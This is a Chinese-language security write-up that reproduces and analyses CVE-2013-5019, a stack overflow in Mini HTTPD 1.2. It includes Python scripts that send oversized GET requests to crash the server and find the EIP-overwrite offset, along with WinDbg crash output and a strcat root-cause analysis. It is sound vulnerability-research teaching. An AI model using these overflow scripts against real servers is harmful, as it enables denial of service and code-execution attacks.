# MINI HTTPD 远程代码执行漏洞分析

> **来源**: https://forum.butian.net/share/2926  
> **文章ID**: 2926

---

MINI HTTPD 远程代码执行漏洞分析
=====================

> 本文是跟随k0师傅的脚步进行分析复现的，在此基础上做出了更为详尽的分析，向k0师傅学习。  
> All the credit goes to k0shl.
> 
> ## 漏洞说明

**Name:** Ultra Mini HTTPD Stack Buffer Overflow  
**Module:** exploit/windows/http/ultraminihttp\_bof  
**Source code:** [modules/exploits/windows/http/ultraminihttp\_bof.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/ultraminihttp_bof.rb)  
**Disclosure date:** 2013-07-10  
**Last modification time:** 2020-10-02 17:38:06 +0000  
**Supported architecture(s):** -  
**Supported platform(s):** Windows  
**Target service / protocol:** http, https  
**Target network port(s):** 80, 443, 3000, 8000, 8008, 8080, 8443, 8880, 8888  
**List of CVEs:** [CVE-2013-5019](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5019)

该模块利用了Ultra Mini HTTPD 1.21中基于堆栈的缓冲区溢出，允许远程攻击者通过HTTP请求中的长资源名执行任意代码。此漏洞必须处理应用程序的请求处理程序线程在60秒后被监视器线程终止的问题。为此，它分配一些RWX内存，将负载复制到它并创建另一个线程。完成后，它终止当前线程，这样它就不会崩溃，从而不会使进程崩溃。

下载地址
----

下载地址最好使用我提供的链接处下载，操作系统不一致debug结果可能会显示不同。  
操作系统：[Windows XP Home with Service Pack 3 (x86) - CD Retail (English)](https://archive.org/details/windows-xp-all-sp-msdn-iso-files-en-de-ru-tr-x86-x64)  
漏洞软件：[MINI HTTPD](https://www.exploit-db.com/apps/847d772037159c4559bd41a439489ee7-minihttpd120.lzh)  
windbg for windows XP:[dbg\_x86\_6.11.1.404.msi](https://github.com/pyrasis/windowsprojectbook/blob/master/Applications/Debugging%20Tools%20for%20Windows/dbg_x86_6.11.1.404.msi)  
windows XP 激活码：[xp-key](https://github.com/10cks/xp)  
python安装包：[Python 3.3.4 Download](https://www.python.org/downloads/release/python-334/)  
pip安装：[get-pip.py](https://bootstrap.pypa.io/pip/3.3/get-pip.py)

测试环境
----

测试环境：Windows XP Home with Service Pack 3 (x86)  
调试软件：windbgIDA pro 8.3（宿主机）/ windbg 6.11（虚拟机）

漏洞复现
----

此漏洞形成的原因是因为Mini HTTPD服务器在接收请求的URL数据时，会将URL拼接成一个路径去尝试读取文件，当没有读取到文件的时候，会拼接成一个Not Found语句输出，在这个过程中，没有对URL的长度进行严格的检查，从而导致在最后拼接的时候发生栈溢出，导致返回地址覆盖从而执行任意代码，下面对此漏洞进行详细分析。  
这个漏洞也可以使用MSF进行直接利用，这里我们使用python poc进行分析：

```python
import sys
import socket

# Create the buffer.
buffer = ""

for i in range(10):
    buffer += chr(ord('A') + i) * 1000

HOST = '127.0.0.1'
PORT = 80

req = "GET /" + buffer + " HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req.encode())

# Receive data until the socket is closed.
data = b""
while True:
    chunk = s.recv(1024)
    if not chunk:
        break
    data += chunk

s.close()
print('Received', repr(data))
```

下载minihttpd120.lzh后进行解压（与zip或rar类似），点击运行`minihttpd.exe`就开启web服务了，访问`http://localhost`可以看到404 Not Found，说明我们程序正常运行：

![Pasted image 20240328193246.png](images/attach-ef9275dc6765d53769e3c2915f76e259d421cfdd.png)

接着运行poc，来打崩服务：

![Pasted image 20240328171003.png](images/attach-49d5f08dc9aa229681522c0f01951945556978b0.png)

可以看到`eip=41414141`，此刻eip指针已经被覆盖了，我们需要确定一下多长覆盖的eip，使用下面的脚本：

```python
import sys
import socket

# Create the buffer.
buffer = ""

for i in range(10):
    buffer += chr(ord('A') + i) * 1000

HOST = '127.0.0.1'
PORT = 80

req = "GET /" + buffer + " HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req.encode())

# Receive data until the socket is closed.
data = b""
while True:
    chunk = s.recv(1024)
    if not chunk:
        break
    data += chunk

s.close()
print('Received', repr(data))
```

可以看到在F(0x46)处填充就已经crash了：

![Pasted image 20240328172548.png](images/attach-ab6d1043f48ee3b5f359da3cc81b905009fbf2ae.png)

```php
0:002> g
(964.ba0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7e8aa
eip=46464646 esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
46464646 ??              ???
```

查看当前栈回溯：

```php
0:003> kb
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
00c7dc68 46464646 46464646 46464646 46464646 0x46464646
00c7dc6c 46464646 46464646 46464646 46464646 0x46464646
00c7dc70 46464646 46464646 46464646 46464646 0x46464646
00c7dc74 46464646 46464646 46464646 46464646 0x46464646
00c7dc78 46464646 46464646 46464646 46464646 0x46464646
00c7dc7c 46464646 46464646 46464646 46464646 0x46464646
00c7dc80 46464646 46464646 46464646 46464646 0x46464646
00c7dc84 46464646 46464646 46464646 46464646 0x46464646
00c7dc88 46464646 46464646 46464646 46464646 0x46464646
00c7dc8c 46464646 46464646 46464646 46464646 0x46464646
00c7dc90 46464646 46464646 46464646 46464646 0x46464646
00c7dc94 46464646 46464646 46464646 46464646 0x46464646
00c7dc98 46464646 46464646 46464646 46464646 0x46464646
00c7dc9c 46464646 46464646 46464646 46464646 0x46464646
00c7dca0 46464646 46464646 46464646 46464646 0x46464646
00c7dca4 46464646 46464646 46464646 46464646 0x46464646
00c7dca8 46464646 46464646 46464646 46464646 0x46464646
00c7dcac 46464646 46464646 46464646 46464646 0x46464646
00c7dcb0 46464646 46464646 46464646 46464646 0x46464646
00c7dcb4 46464646 46464646 46464646 46464646 0x46464646
```

接下我是不断二分法去找什么时候crash的，类似下面的脚本，最后测出在"F"为397时会crash：

```python
import sys
import socket

# Create the buffer.
buffer = ""

for i in range(5):
    buffer += chr(ord('A') + i) * 1000

# 375-400
buffer += "F" * 400

HOST = '127.0.0.1'
PORT = 80

req = "GET /" + buffer + " HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req.encode())

# Receive data until the socket is closed.
data = b""
while True:
    chunk = s.recv(1024)
    if not chunk:
        break
    data += chunk

s.close()
print('Received', repr(data))
```

crash后windbg显示如下：

```php
0:002> g
(f48.b18): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=000000c8 ecx=ffffffff edx=00000007 esi=7d58dc91 edi=0000000e
eip=0040260d esp=00c7dc6c ebp=836f09be iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
*** WARNING: Unable to verify checksum for C:\Documents and Settings\Owner\Desktop\847d772037159c4559bd41a439489ee7-minihttpd120\minihttpd\minihttpd.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Documents and Settings\Owner\Desktop\847d772037159c4559bd41a439489ee7-minihttpd120\minihttpd\minihttpd.exe
minihttpd+0x260d:
0040260d f2ae            repne scas byte ptr es:[edi]
0:003> kb
ChildEBP RetAddr  Args to Child              
WARNING: Stack unwind information not available. Following frames may be wrong.
00c7dc68 00c7e268 00000000 0000009c 00c9ffec minihttpd+0x260d
00c7dc6c 00000000 0000009c 00c9ffec 00a9fbac 0xc7e268
0:003> dd esp
00c7dc6c  00c7e268 00000000 0000009c 00c9ffec
00c7dc7c  00a9fbac 00001527 00000000 00000000
00c7dc8c  0000009c 00000000 ffffffff 0a000a0d
00c7dc9c  00000000 0000007f 00000000 00000000
00c7dcac  00000001 ffffffff 00000000 00000000
00c7dcbc  00000000 00000000 00000000 00000000
00c7dccc  00000000 00000000 00000000 00000000
00c7dcdc  00000000 00000000 00000000 00000000
```

可以看到`eip=0040260d`，在IDA中 `.text:0040260D    repne scasb`  
`repne scasb`这条指令在ZF标志位为0的情况下连续执行`scasb`操作，也就是连续比较AL寄存器的值和内存当前(E)DI指向的字节值，直到两者相等或者检查完了所有的元素。这个指令常常用于在一个字符串中查找特定的字符。

该指令此处被strcat函数进行调用：

![Pasted image 20240328204436.png](images/attach-1d4f89f67f13f02f6b4f6c4d956a4074d7fb9267.png)

`strcat` 是C语言中的一个标准库函数，用于字符串的连接。它的原型如下：

```c
char * strcat ( char * destination, const char * source );
```

- `destination`：指向要追加的目标字符串，它应该足够大，能够容纳追加后的结果。
- `source`：指向源字符串，这个字符串会被追加到目标字符串`destination`的末尾。

返回值是一个指向`destination`的指针。例如：

```c
char dest[20]="Hello";
char src[20]=" World";
strcat(dest, src);
```

执行完上述代码后，`dest`字符串变为 "Hello World"。使用`strcat`时，必须要确保目标字符串`destination`有足够的空间来容纳追加的内容以及末尾的空字符`('\0')`，否则可能会导致缓冲区溢出的问题。目前这个函数的安全版本是`strncat`，可以避免这种问题。

`strcat(v119, v114);`中有两个参数，其中v114的值使用sprintf传进来的：

![Pasted image 20240328210954.png](images/attach-6b64994247631727831b57ab88232d880d76f14d.png)

`sprintf(v114, a404NotFound);` 中，`a404NotFound` 是一个字符串，它将被复制到 `v114` 指向的字符数组中，这个函数并没有触发crash。  
画了一个函数调用逻辑图，来让我们更直观的查看触发的逻辑：

![Pasted image 20240328215311.png](images/attach-a699dda2b3aa85478157c2b1f997d00d2e6a3271.png)

程序在接收到数据时会去拼接目标路径并进行打开，如果打开失败就会跳转到失败处理中，在失败处理中，会去执行打印404 not found的操作。  
`if ( TargetHandle == (HANDLE)-1 )` 这句代码就是在检查 `TargetHandle` 是否等于错误的 `HANDLE` 值。如果是，则表明函数调用失败，需要进行错误的处理。  
由于文件肯定不存在，所以一定会进入错误处理流程。

![Pasted image 20240328213849.png](images/attach-b2472f24a2f9669082f94a2d9de44295af91ae5e.png)

进入错误处理流程会执行sprintf函数进行格式化字符串，然后执行strcat函数把字符串附加到另一个字符串末尾，因为strcat函数没有对传入参数进行检查，最后导致了缓冲区溢出，任意代码能够执行。

参考文章
----

[MINI HTTPD远程代码执行漏洞(CVE-2013-5019)](https://whereisk0shl.top/post/2016-10-30)  
[ultraminihttp\_bof](https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/windows/http/ultraminihttp_bof)  
[Mini HTTPD 1.2 Exploit writing from scratch.](https://hardsec.net/mini-httpd-1-2-exploit-writing-from-scratch/)
